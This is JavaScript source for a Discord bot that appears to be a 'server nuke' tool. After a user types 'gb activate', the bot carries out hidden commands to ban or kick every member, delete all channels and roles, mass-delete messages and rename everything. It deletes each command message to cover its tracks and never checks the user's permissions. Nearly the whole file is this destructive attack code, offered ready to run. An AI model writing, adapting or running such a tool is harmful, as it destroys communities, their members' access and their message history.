const config = require("./config.json");

const Discord = require("discord.js");

const client = new Discord.Client();

client.on("ready", () => {
  console.log("I'm ready! I'm ready!");
});

var listening = [];
var list = "gb activate(listens to your commands),gb deactive(stops listening to your commands),ban all,kick all,delete channels,delete roles,clear all,clear,clear --CHANNEL NAME HERE--,kick --MENTION SOMEONE HERE--,ban--MENTION SOMEONE HERE--,delete channel --CHANNEL NAME HERE--,delete role --ROLE NAME HERE--,edit all channels --NEW NAME HERE--,edit all roles --NEW NAME HERE--,edit channel --CHANNEL NAME HERE-- --NEW NAME HERE--,edit role --ROLE NAME HERE-- --NEW NAME HERE--".split(",");
client.on("message", msg => {
  if (msg.author.bot) return;
  if (!msg.guild.channels) return;
  if (msg.content.toLowerCase() == "<help") {
    msg.delete();
    msg.author.send("Here's a list!\n" + list.join("\n"));
    return;
  }
  if (msg.content.toLowerCase() === "gb activate") {
    msg.delete();
    for (i=0;i<listening.length;i++) {
      if (listening[i] === msg.author.username) {
        return msg.reply("You're already active!");
      }
    }
    return listening.push(msg.author.username);
  } else if (msg.content.toLowerCase() === "gb deactivate") {
    msg.delete();
    for (i=0;i<listening.length;i++) {
      if (listening[i] === msg.author.username) {
        listening.splice(i, 1);
        return;
      }
    }
    return msg.reply("You're not active!");
  }
  for (i=0;i<listening.length;i++) {
    if (listening[i] === msg.author.username) {
      msg.delete();
      if (msg.content.toLowerCase() === "ban all") {
        msg.guild.members.forEach(member => {
          if (member.bannable) {
            member.ban(7).catch(() => {});
          }
        });
        return;
      }
      if (msg.content.toLowerCase() === "kick all") {
        msg.guild.members.forEach(member => {
          if (member.kickable) {
            member.kick().catch(() => {});
          }
        });
        return;
      }
      if (msg.content.toLowerCase() === "delete channels") {
        msg.guild.channels.forEach(channel => {
          channel.delete().catch(() => {});
        });
        return;
      }
      if (msg.content.toLowerCase() === "delete roles") {
        msg.guild.roles.forEach(role => {
            role.delete().catch(() => {});
        });
        return;
      }
      if (msg.content.toLowerCase() === "clear all") {
        msg.guild.channels.forEach(channel => {
          channel.bulkDelete(100).catch(() => {});
        });
        return;
      }
      if (msg.content.toLowerCase() === "clear") {
        msg.channel.bulkDelete(100).catch(() => {});
        return;
      }
      if (msg.content.toLowerCase().startsWith("clear")) {
        var cha = msg.content.split(" ")[1].toString().replace(/#/, "");
        msg.guild.channels.find("name", cha).bulkDelete(100).catch(() => {});
        return;
      }
      if (msg.content.toLowerCase().startsWith("kick")) {
        if (!msg.mentions.members) return msg.reply("Please mention someone!");
        var member = msg.mentions.members.first();
        if (member.kickable) {
          member.kick().catch(() => {});
        }
        return;
      }
      if (msg.content.toLowerCase().startsWith("ban")) {
        if (!msg.mentions.members) return msg.reply("Please mention someone!");
        var member = msg.mentions.members.first();
        var dayz = parseInt(msg.content.split(" ")[2]);
        if (!dayz && dayz > 0 && dayz < 7) return msg.reply("Please enter a valid number above 0 and under 7");
        if (member.bannable) {
          member.ban(dayz).catch(() => {});
        }
        return;
      }
      if (msg.content.toLowerCase().startsWith("delete channel")) {
        var cha = msg.content.split(" ")[2].toString();
        if (!cha) return msg.reply("Please mention a channel!");
        msg.guild.channels.find("name", cha).delete().catch(() => {});
        return;
      }
      if (msg.content.toLowerCase().startsWith("delete role")) {
        var rol = msg.content.split(" ")[2].toString();
        if (!rol) return msg.reply("Please mention a role!");
        msg.guild.roles.find("name", rol).delete().catch(() => {
          msg.reply("I do not have permissions to remove this role");
        });
        return;
      }
      if (msg.content.toLowerCase().startsWith("edit all channels")) {
        var nam = msg.content.split(" ")[3].toString();
        if(!nam) return msg.reply("Invalid name!");
        msg.guild.channels.forEach(channel => {
          channel.setName(nam).catch(() => {});
        });
        return;
      }
      if (msg.content.toLowerCase().startsWith("edit all roles")) {
        var nam = msg.content.split(" ")[3].toString();
        if(!nam) return msg.reply("Invalid name!");
        msg.guild.roles.forEach(role => {
          role.setName(nam).catch(() => {});
        })
        return;
      }
      if (msg.content.toLowerCase().startsWith("edit channel")) {
        var cha = msg.content.split(" ")[2];
        var nam = msg.content.split(" ")[3];
        if (!nam) return msg.reply("Invalid name!");
        if (!cha) return msg.reply("Invalid channel!");
        try {
        msg.guild.channels.find("name", cha).setName(nam).catch(() => {});
      } catch (e) {
      }
      return;
      }
      if (msg.content.toLowerCase().startsWith("edit role")) {
        var rol = msg.content.split(" ")[2];
        var nam = msg.content.split(" ")[3];
        if (!nam) return msg.reply("Invalid name!");
        if (!rol) return msg.reply("Invalid role!");
        try {
        msg.guild.roles.find("name", rol).setName(nam).catch(() => {});
      } catch (e) {
      }
      return;
      }
      return msg.reply("That command doesn't exist!");
    }
    }
  return;
});

client.login(config.token);
